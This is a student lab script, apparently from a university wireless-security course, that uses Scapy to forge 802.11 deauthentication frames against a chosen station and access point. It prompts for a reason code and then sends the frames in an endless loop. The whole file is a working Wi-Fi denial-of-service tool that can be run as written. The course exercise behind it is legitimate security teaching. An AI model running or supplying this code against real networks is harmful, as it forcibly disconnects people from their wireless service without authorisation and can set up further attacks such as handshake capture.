# SWI - Labo1-MAC1
# Date: 28.02.2020
# File: deauthentication.py
# Students: Stefan Dejanovic, Nathanael Mizutani

# source : https://www.shellvoide.com/python/forge-and-transmit-de-authentication-packets-over-the-air-in-scapy/
# -*- coding: utf-8 -*-

from scapy.all import *

# Checking if we put all the argument
if len(sys.argv) != 4:
    print("Please add arguments to use the script")
    print("1 argument: MAC station")
    print("2 argument: MAC access point")
    print("3 arguemnt: Interface")
    exit()

# Define the reason to deauth, if the person don't choose the good number it will stay on the loop while
while(True):
    print("##########################################")
    print("#       DEAUTHENTIFICATION FRAME         #")
    print("###########################################")
    print("1 - Unspecified")
    print("4 - Disassociated due to inactivity")
    print("5 - Disassociated because AP is unable to handle all currently associated stations")
    print("8 - Deauthenticated because sending STA is leaving BSS")

    # Get reason input information
    reason = input("Choose one of the 4 reasons:")

    # if the user choose one of the 4 reasons defined
    if int(reason) == 1 or int(reason) == 4 or int(reason) == 5 or int(reason) == 8:
        break

# Define the deauthification
pkt = RadioTap() / Dot11(addr1=sys.argv[1], addr2=sys.argv[2], addr3=sys.argv[2]) / Dot11Deauth(reason=int(reason))

print("Sending deauthentification on station " + sys.argv[1] + ", AP " + sys.argv[2] + " and the reason number " + reason)

# Send the deauthification
while True:
    sendp(pkt, iface=sys.argv[3], verbose=False)
